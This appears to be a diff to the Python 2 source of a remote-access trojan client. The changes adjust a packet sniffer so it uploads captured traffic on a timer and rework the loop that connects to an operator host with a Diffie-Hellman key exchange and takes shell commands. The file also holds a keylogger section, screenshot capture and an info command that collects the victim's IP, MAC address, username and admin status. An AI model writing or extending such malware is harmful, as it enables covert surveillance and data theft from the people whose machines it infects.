@@ -330,7 +330,7 @@ class Client(object):
                         
         elif fx.func_name is 'packetsniffer':
             fx.platforms = ['darwin','linux2']
-            fx.options  = {'seconds': 30, 'buffer': []}
+            fx.options  = { 'next_upload': time.time() + 300.0, 'buffer': []}
             
         elif fx.func_name is 'screenshot':
             fx.platforms = ['win32','linux2','darwin']
@@ -404,6 +404,7 @@ class Client(object):
             if result and len(result):
                 result = '\n' + str(result) + '\n'
                 self._send(result, method=cmd)
+                
     @command
     def standby(self):
         while True:
@@ -417,20 +418,20 @@ class Client(object):
                 else:
                     break
             data = self.run()
-
+        
+    @command
     def start(self):
-        self.socket = self._connect(host=self._target(o=self.a, p=self.b))
-        self.dhkey  = self._diffiehellman()
-        exit_status = 0
-        if self.v:
-            print 'connected successfully'
-        while not exit_status:
-            if not self.mode:
-                self.shell()
-            else:
-                self.standby()
-            exit_status = self.exit
-        sys.exit(0)
+        if self.a and self.b:
+            self.socket = self._connect(host=self._target(o=self.a, p=self.b))
+            self.dhkey  = self._diffiehellman()
+            while True:
+                if self.exit:
+                    break
+                elif self.mode:
+                    self.standby()
+                else:
+                    self.shell()
+            sys.exit(0)
         
 # ----------------- KEYLOGGER --------------------------
 
@@ -917,10 +918,10 @@ class Client(object):
     def show(self, target): return self._show(getattr(self, target)) if bool(hasattr(self, target) and target in ('results','jobs')) else 'usage: show <jobs/options/modules>'
 
     @command
-    def use(self, module): return self.modules[module].status = True if module in self.modules
+    def use(self, module): return self._use(module)
 
     @command
-    def stop(self, module): return self.modules[module].status = False if module in self.modules    
+    def stop(self, module): return self._stop(module)  
 
     @command
     def info(self, **args): return {'IP Address': self.ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).rstrip() if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
